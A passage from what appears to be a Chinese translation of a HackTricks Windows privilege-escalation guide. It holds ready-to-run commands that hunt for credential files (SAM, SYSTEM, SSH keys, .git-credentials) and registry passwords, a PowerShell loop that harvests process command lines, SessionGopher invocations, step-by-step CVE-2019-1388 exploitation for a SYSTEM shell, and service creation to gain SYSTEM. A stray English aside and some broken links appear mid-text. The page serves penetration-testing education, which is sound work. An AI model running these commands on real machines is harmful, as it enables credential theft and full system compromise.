%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
搜索所有提议的文件：
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### 回收站中的凭据

您还应该检查回收站以查找其中的凭据。

要**恢复**多个程序保存的密码，您可以使用：[http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password\_recovery\_tools.html)

### 注册表中的内容

**其他可能包含凭据的注册表键**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**从注册表中提取openssh密钥。**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### 浏览器历史记录

您应该检查存储了**Chrome或Firefox**密码的数据库。\
还应检查浏览器的历史记录、书签和收藏夹，以查看是否存储了一些**密码**。

从浏览器中提取密码的工具：

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)\*\*\*\*

### **COM DLL覆盖**

**组件对象模型(COM)** 是Windows操作系统内置的一种技术，允许不同语言的软件组件之间进行**互通**。每个COM组件通过类ID (CLSID) 进行**标识**，每个组件通过一个或多个接口进行功能暴露，接口通过接口ID (IID) 进行**标识**。

COM类和接口在注册表的**HKEY\_**_**CLASSES\_**_**ROOT\CLSID**和**HKEY\_**_**CLASSES\_**_**ROOT\Interface**下定义。此注册表是通过合并**HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT**创建的。

在此注册表的CLSIDs中，您可以找到包含**默认值**指向**DLL**的子注册表**InProcServer32**，以及一个名为**ThreadingModel**的值，可以是**Apartment**（单线程）、**Free**（多线程）、**Both**（单线程或多线程）或**Neutral**（线程中立）。

![](<../../.gitbook/assets/image (638).png>)

基本上，如果您可以**覆盖将要执行的任何DLL**，并且该DLL将由不同的用户执行，那么您可以**提升权限**。

要了解攻击者如何使用COM劫持作为持久性机制，请查看：

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **在文件和注册表中搜索通用密码**

**搜索文件内容**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**搜索具有特定文件名的文件**

To search for a file with a certain filename, you can use the `dir` command in the Windows command prompt. The `dir` command allows you to list the files and directories in a specified location.

To search for a file with a specific filename, follow these steps:

1. Open the command prompt by pressing `Win + R` and typing `cmd`, then press `Enter`.
2. Navigate to the directory where you want to search for the file using the `cd` command. For example, if you want to search in the `C:\Users\Username\Documents` directory, you would type `cd C:\Users\Username\Documents` and press `Enter`.
3. Once you are in the desired directory, use the `dir` command followed by the filename you want to search for. For example, if you want to search for a file named `example.txt`, you would type `dir example.txt` and press `Enter`.
4. The command prompt will display a list of files matching the specified filename, along with their file attributes and sizes.

You can also use wildcards to search for files with similar names. For example, if you want to search for all files with the extension `.txt`, you can use the `dir *.txt` command.

Remember to adjust the directory path and filename according to your specific search criteria.
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**搜索注册表以查找键名和密码**

在进行本地特权升级时，搜索注册表是一种常用的技术。注册表是Windows操作系统中存储配置信息的关键数据库。通过搜索注册表，我们可以找到存储在其中的敏感信息，如键名和密码。

以下是一些常见的注册表位置，可能包含敏感信息：

- `HKEY_LOCAL_MACHINE\SOFTWARE`
- `HKEY_CURRENT_USER\SOFTWARE`
- `HKEY_USERS\.DEFAULT`
- `HKEY_USERS\S-1-5-18`
- `HKEY_USERS\S-1-5-19`
- `HKEY_USERS\S-1-5-20`

要搜索注册表，可以使用以下命令：

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE" /s
```

这将递归地搜索`HKEY_LOCAL_MACHINE\SOFTWARE`键下的所有子键和值，并显示它们的名称和数据。

请注意，搜索注册表可能需要管理员权限。
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### 搜索密码的工具

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) 是我创建的一个msf插件，用于自动执行每个在受害者内部搜索凭据的metasploit POST模块。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 自动搜索包含在此页面中提到的密码的所有文件。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) 是另一个从系统中提取密码的强大工具。

工具[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) 搜索几个将此数据以明文保存的工具的**会话**、**用户名**和**密码**（PuTTY、WinSCP、FileZilla、SuperPuTTY和RDP）。
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## 泄露的句柄

假设**一个以SYSTEM权限运行的进程**使用`OpenProcess()`打开了一个新进程，该进程具有**完全访问权限**。同样的进程还使用`CreateProcess()`创建了一个**权限较低但继承了主进程所有打开句柄的新进程**。\
然后，如果你对**权限较低的进程具有完全访问权限**，你可以获取使用`OpenProcess()`创建的**对特权进程的打开句柄**，并注入shellcode。\
[阅读此示例以了解有关**如何检测和利用此漏洞**的更多信息。](leaked-handle-exploitation.md)\
[阅读此**其他文章以获取有关如何测试和滥用具有不同权限级别（不仅仅是完全访问权限）的继承的进程和线程的更完整解释**的信息](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)。

## 命名管道客户端模拟

`管道`是进程之间可以用于通信和数据交换的共享内存块。

`命名管道`是Windows的一种机制，它使得两个不相关的进程可以在彼此之间交换数据，即使这些进程位于两个不同的网络上。它非常类似于客户端/服务器架构，因为存在`命名管道服务器`和`命名管道客户端`的概念。

当**客户端在管道上写入数据**时，创建管道的**服务器**可以**模拟**具有**SeImpersonate**权限的**客户端**。因此，如果你能找到一个**将要写入你可以模拟的任何管道的特权进程**，你可能能够在该进程写入你创建的管道后，通过模拟该进程来**提升权限**。[**你可以阅读这个来学习如何执行这种攻击**](named-pipe-client-impersonation.md)**或者**[**这个**](./#from-high-integrity-to-system)**。**

**此外，以下工具允许使用类似burp的工具拦截命名管道通信：**[**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept)**，而此工具允许列出和查看所有管道以查找权限提升：**[**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)****

## 其他

### **监视命令行以获取密码**

当以用户身份获取shell时，可能会执行预定任务或其他进程，这些进程会**在命令行中传递凭据**。下面的脚本每两秒捕获进程的命令行，并将当前状态与上一个状态进行比较，输出任何差异。
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## 从低权限用户到NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC绕过

如果您可以访问图形界面（通过控制台或RDP），并且UAC已启用，在某些版本的Microsoft Windows中，可以从非特权用户运行终端或任何其他进程，如"NT\AUTHORITY SYSTEM"。

这使得可以利用同一漏洞同时提升权限和绕过UAC。此外，无需安装任何东西，而且在此过程中使用的二进制文件由Microsoft签名和发布。

以下是一些受影响的系统：
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
为了利用这个漏洞，需要执行以下步骤：

```
1) 右键点击HHUPD.EXE文件，并以管理员身份运行。

2) 当UAC提示出现时，选择“显示更多细节”。

3) 点击“显示发布者证书信息”。

4) 如果系统存在漏洞，在点击“发行者”URL链接时，会出现默认的网页浏览器。

5) 等待网站完全加载完成，并选择“另存为”以打开一个explorer.exe窗口。

6) 在explorer窗口的地址路径中，输入cmd.exe、powershell.exe或任何其他交互式进程。

7) 现在你将拥有一个“NT\AUTHORITY SYSTEM”命令提示符。

8) 记得取消安装并关闭UAC提示，以返回到桌面。
```

你可以在以下GitHub存储库中找到所有必要的文件和信息：

https://github.com/jas502n/CVE-2019-1388

## 从管理员中权限提升到高权限级别 / UAC绕过

阅读以下内容以了解**完整性级别**：

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

然后**阅读以下内容以了解UAC和UAC绕过**：

{% content-ref url="../windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](../windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

## **从高权限级别提升到系统权限**

### **新建服务**

如果你已经在高权限进程上运行，那么**通过创建和执行一个新的服务**可以很容易地**提升到系统权限**：
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

从高完整性进程中，您可以尝试**启用AlwaysInstallElevated注册表项**并使用**.msi**包装器**安装**一个反向shell。\
[有关涉及的注册表键和如何安装_.msi_包的更多信息，请点击此处。](./#alwaysinstallelevated)

### 从高完整性和SeImpersonate权限提升到System

**您可以在此处找到代码**](seimpersonate-from-high-to-system.md)**。

### 从SeDebug + SeImpersonate到完整令牌权限

如果您拥有这些令牌权限（可能会在已经具有高完整性的进程中找到），您将能够**打开几乎任何进程**（不包括受保护的进程），并使用SeDebug权限**复制进程的令牌**，然后使用该令牌创建**任意进程**。\
使用此技术通常会**选择以SYSTEM身份运行的任何进程，并具有所有令牌权限**（是的，您可以找到没有所有令牌权限的SYSTEM进程）。\
**您可以在此处找到执行所提出技术的代码示例**](sedebug-+-seimpersonate-copy-token.md)**。

### **命名管道**

这种技术被meterpreter用于在`getsystem`中进行提升。该技术包括**创建一个管道，然后创建/滥用一个服务来写入该管道**。然后，使用具有**`SeImpersonate`**权限创建管道的**服务器**将能够**模拟管道客户端（服务）的令牌**，从而获得SYSTEM权限。\
如果您想要[**了解有关命名管道的更多信息，请阅读此处**](./#named-pipe-client-impersonation)。\
如果您想要阅读一个[**如何使用命名管道从高完整性提升到System的示例，请阅读此处**](from-high-integrity-to-system-with-name-pipes.md)。

### Dll劫持

如果您成功**劫持正在以SYSTEM身份运行的进程**加载的**dll**，则可以使用这些权限执行任意代码。因此，Dll劫持对于此类权限提升也很有用，并且，此外，如果从高完整性进程中实现，它将具有用于加载dll的文件夹的**写入权限**。\
**您可以在此处了解有关Dll劫持的更多信息**](dll-hijacking.md)**。**

### 从管理员或网络服务到System

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### 从LOCAL SERVICE或NETWORK SERVICE到完整权限

**阅读：**[**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## 更多帮助

[静态impacket二进制文件](https://github.com/ropnop/impacket_static_binaries)

## 有用的工具

**查找Windows本地权限提升向量的最佳工具：**[**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **- 检查配置错误和敏感文件（**[**在此处检查**](../../windows/windows-local-privilege-escalation/broken-reference/)**）。已检测到。**\
[**JAWS**](https://github.com/411Hall/JAWS) **- 检查一些可能的配置错误并收集信息（**[**在此处检查**](../../windows/windows-local-privilege-escalation/broken-reference/)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**- 检查配置错误**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **- 提取PuTTY、WinSCP、SuperPuTTY、FileZilla和RDP保存的会话信息。在本地使用-Thorough选项。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **- 从凭据管理器中提取凭据。已检测到。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **- 在域中扫描收集的密码**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **- Inveigh是一个PowerShell ADIDNS/LLMNR/mDNS/NBNS欺骗和中间人工具。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **- 基本的权限提升Windows枚举**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ - 搜索已知的权限提升漏洞（已弃用，改用Watson）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) - 本地检查（需要管理员权限）

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) - 搜索已知的权限提升漏洞（需要使用VisualStudio编译）（[**预编译版本**](https://github.com/carlospolop/winPE/tree/master/binaries/watson)）\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) - 枚举主机以搜索配置错误（更多是信息收集工具而不是权限提升）（需要编译）（[**预编译版本**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)）\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) - 从许多软件中提取凭据（在github上的预编译exe）\
[**SharpUP**](https://github.com/GhostPack/SharpUp) - PowerUp的C#版本\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ - 检查配置错误（在github上的可执行文件预编译）。不推荐使用。在Win10中效果不好。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) - 检查可能的配置错误（使用python的exe）。不推荐使用。在Win10中效果不好。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) - 基于此帖子创建的工具（不需要accesschk来正常工作，但可以使用它）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) - 读取**systeminfo**的输出并推荐可用的利用（本地python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) - 读取**systeminfo**的输出并推荐可用的利用（本地python）

**Meterpreter**

_multi/recon/local\_exploit\_suggestor_

您必须使用正确版本的.NET编译项目（[参见此处](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。要查看受害主机上安装的.NET版本，可以执行以下操作：
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 参考文献

[http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\
[http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\
[http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
[https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\
[https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=\_8xJaaQlpBo)\
[https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\
[https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\
[https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\
[https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
[https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\
[https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
[http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个 **网络安全公司** 工作吗？想要在 HackTricks 中 **宣传你的公司** 吗？或者想要获得 **PEASS 的最新版本或下载 HackTricks 的 PDF** 吗？请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family) 集合 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **关注** 我的 **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>
